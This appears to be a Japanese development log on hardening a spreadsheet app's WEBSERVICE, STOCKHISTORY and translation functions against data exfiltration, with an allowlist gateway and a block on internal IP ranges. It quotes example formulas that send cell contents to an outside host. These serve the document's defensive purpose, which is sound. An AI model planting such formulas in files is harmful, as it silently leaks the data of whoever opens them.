# 外へ 出る 関数を 作りました（2026-09-07・司さん「全部やって」）

> ★2026-09-07 の 昼に ★数えただけ★で 止めた 物★（`README.md`）を、
> 司さんの 「★全部やって★」で ★作りました★。

---

## ★★作る 前に 分かっていた 事（実測）★★

```
 ★①ブラウザから 外へ 撃つと ★4回／4回とも 相手に 届く★★
    ブラウザの 決まり(CORS)が 止めるのは ★返事を 読む 方だけ★
    ⇒★`=WEBSERVICE("http://よそ?d="&A1)` は
      答えが #VALUE! に なっても ★A1 の 中身は もう 相手に 届いている★★
 ★②もらった `.xlsx` の 式は ★式のまま★ 入る★
    ⇒★★開いた 人が 1文字も 打たなくても 走る★★
    ⇒ 取引先から 来た 見積書を 開いた だけで 社員名簿が 出て行く 形
```

⇒ だから ★そのままの 形では 作りませんでした★

---

## ★★作った 形＝「外へ 出る 口は 1つだけ」★★

```
   画面 ──✕──→ 外          （★直に 出さない★）
   画面 ──→ /api/soto ──→ ★うちが 許した 相手だけ★
```

### ★`api/soto.js` が 守る 物（1つずつ 見張りが 押す）★

| | |
|---|---|
| ① | ★許した 相手だけ★（一覧に 無い 所へは 出ない） |
| ② | ★https だけ★（http は 断る） |
| ③ | ★中の 網の 住所は 断る★（127.0.0.1・10.x・192.168.x・169.254.x・172.16〜31.x・::1） |
| ④ | ★飛ばされた 先も 見る★（許した 相手 → よそ、の すり抜けを 止める） |
| ⑤ | ★1MB／10秒★の 上限 |
| ⑥ | ★読むだけ★（GET だけ・体は 送らない） |
| ⑦ | ★お客さんの 打った 字を そのまま 相手に 渡さない★（住所は うちが 組み立てる） |

★許す 相手を 足す 時の 決まり★

```
 ・★何に 使うか★と ★誰が いつ 決めたか★を 1行 書く（見張りが 無ければ 赤に する）
 ・★お金が かかる 相手は 司さんの 決め★
 ⇒★コードの 直しに なる＝★誰が いつ 足したかが 残る★★
```

---

## ★★作った 4個★★

| 関数 | どこへ 出るか | 中身 |
|---|---|---|
| `WEBSERVICE` | ★うちの サーバ経由で 許した 相手だけ★ | 返って きた 字を そのまま |
| `STOCKHISTORY` | ★stooq の 公開 CSV★（鍵も 契約も 要らない） | 日付・終値ほかの 表 |
| `TRANSLATE` | ★うちの `/api/claude`★ | 訳した 文だけ |
| `DETECTLANGUAGE` | ★うちの `/api/claude`★ | 言語コードだけ |

```
 ★訳す 2つは ★外の 会社と 新しい 契約を していません★★
 ⇒ すでに 在る AI の 口を 使う＝★行き先が 1つ★＝住所を 組み立てられない
```

### ★★エンジンは「待てない」ので こうしました★★

```
 計算エンジンの 関数は ★その場で 答えを 返す★決まり。
 でも 外へ 取りに 行くのは 時間が かかる。
 ⇒★①1回目は `#N/A`（取りに 行っています）★
   ★②届いたら 覚え書きに しまい ★再計算を お願いする★★
   ★③もう一度 計算されて 答えが 出る★
 ⇒★実Excel は その場で 止まって 待つ★＝★ここが 実Excel と 違う★
 ⇒★でも「答えが 出ない」のでは なく「少し 遅れて 出る」★
 ★同じ 住所は 1回しか 取りに 行かない★＝1000行 在っても 外へは 1回
   （見張りで 実際に 10回 押して ★外へは 1回★を 数えた）
```

---

## ★★出す 前に 指示役に 止められた 所（一番 大事）★★

```
 ★指示役の 問い★
   「★お客さんは =WEBSERVICE(…) に 何を 渡しますか★
     あ）住所そのもの（"https://…?q=" & A1 が 書ける）
     い）住所では ない 何か（住所は うちが 組む）
     ★『あ』なら まだ 出さないで ください★」

 ★答え … ★最初は「あ」でした★★
   ⇒ 許した 相手だけに しても
     `=WEBSERVICE("https://許した相手/?q=" & A1)` が 通っていました
   ⇒★★行き先は 安全でも ★A1 の 中身は 相手に 届いていました★★★
   ⇒★もらった ファイルに その 式が 仕込まれていたら 同じ事★

 ★直した★
   ★住所は「★式の 中に 直に 書いた 字★」だけ★
   ⇒ 式の 1つ目が ★字そのもの（STRING）★で なければ 断る
   ⇒ セルを 指す／つなげる／関数で 作る … ★全部 断る★
   ⇒★★式を 書いた 時に 決まっている 住所しか 使えない★★
   ⇒★★だから 開いた 人の 中身は 出て行きようが ない★★

 ★通る 式★     =WEBSERVICE("https://stooq.com/q/d/l?s=msft.us&i=d")
 ★断る 式★     =WEBSERVICE("https://stooq.com/q/d/l?s=" & A5)
                =WEBSERVICE(A5)
                =WEBSERVICE(CONCAT("https://…","x"))
   ⇒★見張りは「断った」だけで なく ★外へ 1回も 行っていない★事も 数える★

 ★もう1つ 自分で 見つけた★
   `=STOCKHISTORY(A1)` は 銘柄が セルから 来る
   ⇒★整えても 長い 字なら 少しずつ 外へ 運べる★
   ⇒ 直し＝★12字までに 切る★（銘柄の 記号は 長くても 10字ほど）

 ★★教訓★★
   私は ⑦に「お客さんの 打った 字を そのまま 相手に 渡さない」と 書いた。
   ⇒★でも それは ★STOCKHISTORY だけ★で WEBSERVICE には 効いていなかった★
   ⇒★★『守っている つもり』を また 書いた★★
   ⇒★『言葉』では なく『★通る 式★』で 確かめる★
```

---

## ★まだ 出来ていない 事★

```
 ★お客さんには 今 ★#N/A だけ★が 見えます★
 ⇒★「取りに 行っています」と 出ないので ★壊れたように 見えます★★
 ⇒★画面の 直し＝★次の 用件★（1押し＝1件）★
```

---

## ★★実Excel と 違う 所（隠しません）★★

```
 ★実Excel の WEBSERVICE は ★どこへでも★ 出ます★
 ★Exally は ★許した 相手だけ★です★
 ⇒★「出来ない」のでは なく「★行き先を うちが 決めている★」★
 ⇒ 訳＝★上の ①②（送るのは 通る／もらった ファイルで 走る）★
 ⇒★相手を 増やすのは 人が 決めて 一覧に 足す★
```

---

## ★★作らなかった 2個（訳つきで 棚に 載せた）★★

| 関数 | 訳 |
|---|---|
| `IMAGE` | ★絵を セルの 上に 置く 仕組み★が まだ 無い（外へ 出る 話では ない） |
| `RTD` | ★向こうから 押してくる 相手（配信の 元）が うちには 無い★＝繋ぐ 先が 無い |

---

## ★数★

```
 ★Exally で 動く … 484/519（93.3%） → ★488/519（94.0%）★★
 ★動かない 台帳 … 35 → ★31★★
 ★AI の 紙 … 動かない 36 → ★32★★
 ★見張り★
   `tests/soto-api.test.mjs` … 9本（門が 守る 物を 1つずつ）
   `tests/formula-soto.test.mjs` … 12本（★外は 作り物★＝お金も 迷惑も かけない）
```
